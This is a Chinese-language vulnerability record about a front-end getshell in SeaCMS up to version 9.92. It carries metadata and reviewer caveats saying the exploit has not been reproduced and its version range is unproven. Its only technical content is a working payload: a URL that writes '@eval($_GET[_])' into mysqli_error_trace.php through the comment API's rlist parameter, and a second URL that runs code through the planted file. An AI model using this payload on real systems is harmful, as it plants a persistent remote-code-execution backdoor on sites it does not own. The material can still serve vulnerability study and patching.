---
source: "hatch 补库批 20260928"
product: "SeaCMS<=9.92"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Seacms <= 9.92 前台Getshell"
prerequisites: "来源所述条件，未列明部分仍待核：comment接口rlist导致代码写mysqli_error_trace.php且Web可执行；旧PHPeval裸常量"
side_effects: "未执行；本文需注意的操作影响：会持久写错误日志，需标副作用；认证/PHP版本/修复出处缺失"
source_status: "unknown"
id: "vw-b31029b79c8ab554c11d3d45"
entity_id: "ve-b31029b79c8ab554c11d3d45"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：comment接口rlist导致代码写mysqli_error_trace.php且Web可执行；旧PHPeval裸常量

- **适用与权限边界（1）**：仅两个URL，无源码解释hex前缀/错误日志写条件及响应；&lt;=9.92范围无证据。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（2）**：会持久写错误日志，需标副作用；认证/PHP版本/修复出处缺失。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Seacms \<= 9.92 前台Getshell

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_]);?%3E

然后访问：

    http://0-sec.org/data/mysqli_error_trace.php?_=phpinfo()
